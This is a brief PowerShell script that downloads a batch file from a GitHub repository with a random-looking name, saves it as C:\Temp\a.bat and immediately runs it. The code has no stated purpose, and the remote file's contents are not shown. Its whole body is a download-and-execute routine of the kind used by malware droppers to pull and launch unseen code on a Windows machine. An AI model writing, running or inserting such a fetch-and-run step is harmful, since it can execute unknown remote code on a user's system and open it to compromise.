# URL of the .bat file
$Url = "https://raw.githubusercontent.com/greetjerry098-web/ahkwfjealyfusdiflwejk/refs/heads/main/a.bat"

# Local path to save it
$OutputPath = "C:\Temp\a.bat"

# Ensure folder exists
$Folder = Split-Path $OutputPath
if (!(Test-Path $Folder)) {
    New-Item -ItemType Directory -Path $Folder | Out-Null
}

# Download the file
Invoke-WebRequest -Uri $Url -OutFile $OutputPath

# Run (open) the .bat file
Start-Process -FilePath $OutputPath
